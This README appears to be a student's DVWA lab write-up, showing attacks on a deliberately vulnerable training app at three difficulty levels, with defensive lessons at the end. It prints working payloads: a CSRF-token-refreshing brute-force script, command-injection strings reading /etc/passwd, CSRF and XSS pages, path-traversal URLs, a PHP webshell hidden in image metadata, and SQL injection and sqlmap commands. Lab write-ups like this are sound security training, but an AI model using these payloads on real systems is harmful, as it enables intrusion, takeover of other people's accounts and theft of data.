# 🔐 DVWA — Web Application Security Case Study

<div align="center">

![DVWA](https://img.shields.io/badge/DVWA-Damn%20Vulnerable%20Web%20App-red?style=for-the-badge)
![Kali Linux](https://img.shields.io/badge/Kali%20Linux-Attacker%20Machine-blue?style=for-the-badge&logo=kalilinux)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)

</div>

---

## 📋 Lab Details

| | |
|---|---|
| **Target** | DVWA (Damn Vulnerable Web Application) |
| **Attacker Machine** | Kali Linux |
| **DVWA URL** | `http://localhost/dvwa/` |
| **Login** | `admin / password` |
| **Tools Used** | Burp Suite · SQLMap · Python · exiftool |
| **Levels Tested** | 🟢 Low · 🟡 Medium · 🔴 High |

---

## 📌 Overview

DVWA is a deliberately insecure PHP/MySQL web application built for security learners. I installed it directly on **Kali Linux** and used it to practice real web attack techniques across three security levels.

This case study documents every vulnerability I tested — the payloads used, why they work, and what I learned from each one.

---

## 🔑 Login Page

Accessed DVWA at `http://localhost/dvwa/login.php` using default credentials.

![Login Page](DVWA/DVWA/LoginPage.png)

![DVWA Home](DVWA/DVWA/HomePage.png)

---

## 📊 Security Levels

| Level | Description |
|---|---|
| 🟢 **Low** | No protection. Raw user input used directly. |
| 🟡 **Medium** | Basic filtering applied. Still bypassable. |
| 🔴 **High** | Stronger controls. Needs a smarter approach. |

---

<br>

# 1. 🔐 Brute Force

> **What is it?** Trying many passwords one by one until the correct one is found. The DVWA brute force module has a simple login form — the goal is to find the admin password automatically.

---

### 🟢 Low Security

No rate limiting, no lockout, no CAPTCHA. Used **Burp Suite Intruder** in Sniper mode with a custom wordlist to find the password instantly.

![Brute Force Low 1](DVWA/DVWA/Bruteforce/low1.png)
![Brute Force Low 2](DVWA/DVWA/Bruteforce/low2.png)
![Brute Force Low 3](DVWA/DVWA/Bruteforce/low3.png)
![Brute Force Low 4](DVWA/DVWA/Bruteforce/low4.png)
![Brute Force Low 5](DVWA/DVWA/Bruteforce/low5.png)

---

### 🟡 Medium Security

The server adds a **2-second delay** after every failed login to slow down tools. Burp Suite Intruder still works — it just takes longer.

![Brute Force Medium 1](screenshots/image8.png)
![Brute Force Medium 2](screenshots/image9.png)
![Brute Force Medium 3](screenshots/image10.png)
![Brute Force Medium 4](screenshots/image11.png)

---

### 🔴 High Security

A **CSRF token** is added to every login request — it changes on every page load, making Burp Intruder useless. I wrote a Python script that fetches a fresh token before each login attempt.

```python
import requests
from bs4 import BeautifulSoup

session = requests.Session()
url = "http://localhost/dvwa/vulnerabilities/brute/"

# Auto login
login_url = "http://localhost/dvwa/login.php"
r = session.get(login_url)
soup = BeautifulSoup(r.text, "html.parser")
token = soup.find("input", {"name": "user_token"})["value"]
session.post(login_url, data={
    "username": "admin", "password": "password",
    "Login": "Login", "user_token": token
})

passwords = ["123456", "password", "admin", "letmein"]
for password in passwords:
    r = session.get(url)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})["value"]
    params = {"username": "admin", "password": password,
              "Login": "Login", "user_token": token}
    r2 = session.get(url, params=params)
    if "Welcome to the password protected area" in r2.text:
        print(f"[+] Found: {password}")
        break
    else:
        print(f"[-] Wrong: {password}")
```

> 💡 The script logs in automatically, then loops through passwords — fetching a fresh CSRF token before every single attempt.

![Brute Force High 1](screenshots/image12.png)
![Brute Force High 2](screenshots/image13.png)
![Brute Force High 3](screenshots/image14.png)
![Brute Force High 4](screenshots/image15.png)
![Brute Force High 5](screenshots/image16.png)
![Brute Force High 6](screenshots/image17.png)
![Brute Force High 7](screenshots/image18.png)
![Brute Force High 8](screenshots/image19.png)
![Brute Force High 9](screenshots/image20.png)
![Brute Force High 10](screenshots/image21.png)
![Brute Force High 11](screenshots/image22.png)
![Brute Force High 12](screenshots/image23.png)

---

<br>

# 2. 💣 Command Injection

> **What is it?** The page runs a `ping` command using your input. If the server doesn't sanitize it, you can chain your own system commands after the IP address.

---

### 🟢 Low Security

Zero input filtering. Used `;` to chain commands directly after the ping.

```
127.0.0.1; whoami
127.0.0.1; cat /etc/passwd
```

![Command Injection Low 1](screenshots/image24.png)
![Command Injection Low 2](screenshots/image25.png)
![Command Injection Low 3](screenshots/image26.png)

---

### 🟡 Medium Security

The server blocks `;` and `&&` — but completely forgets about the pipe `|`.

```
127.0.0.1 | whoami
```

> 💡 The filter only removes `;` and `&&` — pipe is never mentioned.

![Command Injection Medium 1](screenshots/image27.png)
![Command Injection Medium 2](screenshots/image28.png)

---

### 🔴 High Security

More characters are blocked — but there is a **typo in the filter**. It blocks `| ` (pipe + space) but NOT `|` (pipe with no space). One missing space breaks the entire filter.

```
127.0.0.1 |whoami
```

> 💡 No space between `|` and `whoami` — sneaks past the filter completely.

![Command Injection High 1](screenshots/image29.png)
![Command Injection High 2](screenshots/image30.png)

---

<br>

# 3. 🔄 CSRF — Cross-Site Request Forgery

> **What is it?** CSRF tricks a logged-in user into making a request they never intended to. The attacker creates a malicious page that silently submits a form on the victim's behalf.

---

### 🟢 Low Security

No CSRF token and no Referer check. Created an HTML file that auto-submits a password-change form the moment a logged-in user opens it.

```html
<html>
  <body onload="document.getElementById('f').submit()">
    <form id="f" action="http://localhost/DVWA/vulnerabilities/csrf/" method="GET">
      <input type="hidden" name="password_new"  value="hacked">
      <input type="hidden" name="password_conf" value="hacked">
      <input type="hidden" name="Change"        value="Change">
    </form>
  </body>
</html>
```

> 💡 When a logged-in DVWA user opens `attack.html` — their password is changed to `hacked` without them clicking anything.

![CSRF Low 1](screenshots/image31.png)
![CSRF Low 2](screenshots/image32.png)

---

### 🟡 Medium Security

The server checks the `Referer` header — but only looks if the hostname appears **anywhere** inside it. Saved the attack file inside a folder named `localhost`:

```bash
mkdir -p /var/www/html/localhost
cp attack.html /var/www/html/localhost/
```

Then opened: `http://localhost/localhost/attack.html`

> 💡 The Referer header contains `localhost` — the weak check passes even though the request is forged.

![CSRF Medium 1](screenshots/image33.png)
![CSRF Medium 2](screenshots/image34.png)
![CSRF Medium 3](screenshots/image35.png)

---

### 🔴 High Security

A proper CSRF token is required. Bypassed by **chaining with Stored XSS** — injecting a script that steals the token from inside the victim's own browser session and immediately uses it.

```html
<img src=x onerror="
  var x=new XMLHttpRequest();
  x.open('GET','/DVWA/vulnerabilities/csrf/',true);
  x.onload=function(){
    var t=x.responseText.match(/user_token.*?value='([^']+)'/)[1];
    new Image().src='/DVWA/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change&user_token='+t;
  };
  x.send();">
```

> 💡 This runs entirely inside the victim's browser — the server sees a valid token and accepts the request.

![CSRF High 1](screenshots/image36.png)
![CSRF High 2](screenshots/image37.png)
![CSRF High 3](screenshots/image38.png)

---

<br>

# 4. 📂 File Inclusion (LFI)

> **What is it?** The page loads a file based on a URL parameter. If there's no restriction, an attacker can read any file on the server — including sensitive system files.

---

### 🟢 Low Security

No path restrictions. Read the server's user list by passing an absolute path directly.

```
http://localhost/DVWA/vulnerabilities/fi/?page=/etc/passwd
```

![File Inclusion Low](screenshots/image39.png)

---

### 🟡 Medium Security

The server strips `../` from the input — but only **once**, not recursively. Using `....//` bypasses it.

```
http://localhost/DVWA/vulnerabilities/fi/?page=....//....//....//etc/passwd
```

> 💡 `....//` becomes `../` after one strip — still traverses up the directory tree.

![File Inclusion Medium](screenshots/image40.png)

---

### 🔴 High Security

Only filenames starting with the word `file` are permitted. The `file://` URI scheme starts with "file" — so it passes the check.

```
http://localhost/DVWA/vulnerabilities/fi/?page=file:///etc/passwd
```

![File Inclusion High](screenshots/image41.png)

---

<br>

# 5. 📁 File Upload → Remote Code Execution

> **What is it?** The page lets you upload images. If the server doesn't validate properly, a PHP webshell can be uploaded and used to execute commands on the server — **Remote Code Execution (RCE)**.

---

### 🟢 Low Security

No validation at all. Uploaded a one-line PHP webshell directly.

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Then visited:
```
http://localhost/DVWA/hackable/uploads/shell.php?cmd=id
```

> ✅ Result: `uid=33(www-data) gid=33(www-data)` — full RCE confirmed.

![File Upload Low 1](screenshots/image42.png)
![File Upload Low 2](screenshots/image43.png)
![File Upload Low 3](screenshots/image44.png)
![File Upload Low 4](screenshots/image45.png)

---

### 🟡 Medium Security

The server checks the `Content-Type` header — but this is sent by the browser and can be changed. Used **Burp Suite** to intercept and modify:

```
Content-Type: application/x-php  →  Content-Type: image/jpeg
```

> 💡 The server trusts the Content-Type header blindly — changing it tricks the server into accepting the PHP file.

![File Upload Medium 1](screenshots/image46.png)
![File Upload Medium 2](screenshots/image47.png)
![File Upload Medium 3](screenshots/image48.png)
![File Upload Medium 4](screenshots/image49.png)

---

### 🔴 High Security

The server checks both the **file extension** AND actual image content using `getimagesize()`. Used **exiftool** to hide PHP code inside a real image's EXIF metadata.

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' photo.jpg
cp photo.jpg shell.php.jpg
```

Then triggered via File Inclusion:
```
http://localhost/DVWA/vulnerabilities/fi/?page=/var/www/html/DVWA/hackable/uploads/shell.php.jpg&cmd=whoami
```

> 💡 **Chained attack** — File Upload High + File Inclusion = RCE. The image passes all checks but contains executable PHP code in the metadata.

![File Upload High 1](screenshots/image50.png)
![File Upload High 2](screenshots/image51.png)
![File Upload High 3](screenshots/image52.png)
![File Upload High 4](screenshots/image53.png)

---

<br>

# 6. 💉 SQL Injection

> **What is it?** SQL Injection happens when user input is placed directly into a database query. An attacker can manipulate the query to read data they should never access — like usernames and password hashes.

---

### 🟢 Low Security

No sanitization. The user ID goes directly into the query. Used classic UNION-based injection to dump the users table.

```
1' OR '1'='1
1' UNION SELECT user, password FROM users-- -
```

Also automated with SQLMap:

```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=YOUR_SESSION_ID; security=low" --dbs
```

> ✅ SQLMap identified MySQL as the backend and dumped all databases including `dvwa`.

![SQL Injection Low 1](screenshots/image54.png)
![SQL Injection Low 2](screenshots/image55.png)
![SQL Injection Low 3](screenshots/image56.png)

---

### 🟡 Medium Security

The server uses `mysqli_real_escape_string()` but forgets to wrap the value in quotes. Numeric injection requires no quotes at all.

```
1 OR 1=1
1 UNION SELECT user, password FROM users-- -
```

![SQL Injection Medium 1](screenshots/image57.png)
![SQL Injection Medium 2](screenshots/image58.png)

---

### 🔴 High Security

Input is taken via a **pop-up form** into a session variable — designed to confuse automated tools. The query is still vulnerable. Entered payload in the pop-up, results appear on the main page.

```
1' UNION SELECT user, password FROM users-- -
```

> ⚠️ After submitting in the pop-up — look at the **main page**, not the pop-up itself.

![SQL Injection High 1](screenshots/image59.png)
![SQL Injection High 2](screenshots/image60.png)

---

<br>

# 7. 🪪 Weak Session IDs

> **What is it?** After login, the server assigns a session ID to identify you. If this ID is predictable, an attacker can guess valid IDs and hijack other users' sessions — without knowing their passwords.

---

### 🟢 Low Security

Session IDs are simply **auto-incrementing integers**: 1, 2, 3... Confirmed by clicking Generate multiple times and watching the `dvwaSession` cookie in browser Developer Tools.

![Weak Session Low 1](screenshots/image61.png)
![Weak Session Low 2](screenshots/image62.png)
![Weak Session Low 3](screenshots/image63.png)
![Weak Session Low 4](screenshots/image64.png)
![Weak Session Low 5](screenshots/image65.png)

---

### 🟡 Medium Security

Session ID is now the **current Unix timestamp**. Confirmed using:

```bash
date -d @<session_value>
```

> 💡 Output showed the exact current date and time — still fully predictable.

![Weak Session Medium 1](screenshots/image66.png)
![Weak Session Medium 2](screenshots/image67.png)

---

### 🔴 High Security

Session ID is now an **MD5 hash** — but of a small integer. MD5 of small numbers is instantly reversible.

```bash
echo -n "1" | md5sum
# c4ca4238a0b923820dcc509a6f75849b

echo -n "2" | md5sum
# c81e728d9d4c2f636f067f89cc14862c
```

> 💡 Matched the `dvwaSession` cookie to MD5("1") — confirming it is trivially crackable.

![Weak Session High 1](screenshots/image68.png)
![Weak Session High 2](screenshots/image69.png)

---

<br>

# 8. 🌐 XSS — DOM Based

> **What is it?** DOM XSS happens entirely in the browser. The page reads a URL value and writes it into the HTML using JavaScript — the server never sees the payload, making server-side filters useless.

---

### 🟢 Low Security

The page writes `?default=` directly into the DOM using `document.write` — no encoding.

```
http://localhost/DVWA/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>
```

![XSS DOM Low 1](screenshots/image70.png)
![XSS DOM Low 2](screenshots/image71.png)

---

### 🟡 Medium Security

The server validates `?default=` and redirects if it's not a known language. But the `#` (hash fragment) is **never sent to the server** — only the browser reads it.

```
http://localhost/DVWA/vulnerabilities/xss_d/?default=English#<script>alert('DOM XSS')</script>
```

> 💡 Server sees `?default=English` (valid). Browser reads the script after `#` and executes it.

![XSS DOM Medium 1](screenshots/image72.png)
![XSS DOM Medium 2](screenshots/image73.png)

---

### 🔴 High Security

Script tags are blocked. Broke out of the HTML `<select>` context by closing existing tags and injecting an image with an onerror handler.

```
http://localhost/DVWA/vulnerabilities/xss_d/?default=English</option></select><img src=x onerror=alert(1)>
```

> 💡 The filter only targets `<script>` — HTML event handlers in other tags are completely unaffected.

![XSS DOM High 1](screenshots/image74.png)
![XSS DOM High 2](screenshots/image75.png)

---

<br>

# 9. 🪞 XSS — Reflected

> **What is it?** Reflected XSS means the script is included in the server's response immediately. It "reflects" whatever the user submits and runs it instantly in the browser.

---

### 🟢 Low Security

The name input is reflected directly into HTML with zero encoding.

```html
<script>alert('XSS')</script>
```

![XSS Reflected Low 1](screenshots/image76.png)
![XSS Reflected Low 2](screenshots/image77.png)

---

### 🟡 Medium Security

The server removes the exact string `<script>` — but only script tags. HTML event handlers in other tags still work.

```html
<img src=x onerror="alert('XSS')">
```

> 💡 The filter checks for `<script>` only — an `<img>` tag with `onerror` is invisible to it.

![XSS Reflected Medium](screenshots/image78.png)

---

<br>

# 10. 📝 XSS — Stored

> **What is it?** Stored XSS is the most dangerous type. The malicious script is saved in the **database** and executes for **every user** who visits the page — not just the attacker.

---

### 🟢 Low Security

The guestbook saves both fields with zero sanitization. The script fires for every visitor.

```html
<script>alert('Stored XSS')</script>
```

![XSS Stored Low 1](screenshots/image79.png)
![XSS Stored Low 2](screenshots/image80.png)

---

### 🟡 Medium Security

The message field uses `strip_tags()` — but the **name field** only removes lowercase `<script>`. Injected into the name field using an image tag.

```html
<img src=x onerror=alert('XSS')>
```

> 💡 `strip_tags()` on the message doesn't help when the name field is still wide open.

![XSS Stored Medium 1](screenshots/image81.png)
![XSS Stored Medium 2](screenshots/image82.png)
![XSS Stored Medium 3](screenshots/image83.png)

---

### 🔴 High Security

Script tags blocked by case-insensitive regex — but it only covers `<script>`. Event handlers in other HTML elements are completely unaffected.

```html
<img src=x onerror=alert('XSS')>
```

> 💡 No matter how good the `<script>` regex is — as long as other HTML tags are allowed, XSS is possible.

![XSS Stored High 1](screenshots/image84.png)
![XSS Stored High 2](screenshots/image85.png)
![XSS Stored High 3](screenshots/image86.png)

---

<br>

# 📈 Results Summary

| Vulnerability | 🟢 Low | 🟡 Medium | 🔴 High |
|---|---|---|---|
| **Brute Force** | Burp Intruder | Burp Intruder | Python Script |
| **Command Injection** | `;` separator | `\|` pipe bypass | No-space `\|cmd` |
| **CSRF** | Fake HTML form | Referer bypass | XSS + CSRF chain |
| **File Inclusion** | Read `/etc/passwd` | Nested `..//` bypass | `file://` bypass |
| **File Upload** | PHP webshell | Content-Type spoof | exiftool + LFI |
| **SQL Injection** | UNION dump | Numeric injection | Pop-up bypass |
| **Weak Session IDs** | Sequential guess | Timestamp predict | MD5 cracked |
| **XSS DOM** | Script tag in URL | URL fragment `#` | HTML tag breakout |
| **XSS Reflected** | Script tag | `img onerror` | `img onerror` |
| **XSS Stored** | Script tag | `img onerror` | `img onerror` |

---

<br>

# 🎓 What I Learned

| Topic | Lesson |
|---|---|
| **SQL Injection** | Parameterized queries are the only real fix — escaping alone is not enough |
| **Command Injection** | Never concatenate user input into shell commands |
| **XSS** | Filters targeting specific tags always miss event handlers in other elements |
| **File Upload** | Server-side MIME check + store outside web root is the correct approach |
| **File Inclusion** | Never pass raw user input to `include()` |
| **Brute Force** | Rate limiting + CSRF tokens slow attacks but a Python script still breaks High |
| **CSRF** | Per-request tokens with `SameSite=Strict` is the proper fix |
| **Weak Sessions** | Session IDs must be cryptographically random — never sequential or predictable |

---

<br>

## ⚠️ Disclaimer

> This case study is for **educational purposes only**. All testing was performed locally on DVWA — a deliberately vulnerable application designed for security training. None of these techniques were used on any real system.
>
> Never attempt these techniques on systems you do not own or do not have explicit written permission to test. Unauthorized access to computer systems is illegal.

---

<div align="center">

*Case study authored for cybersecurity portfolio documentation.*

</div>
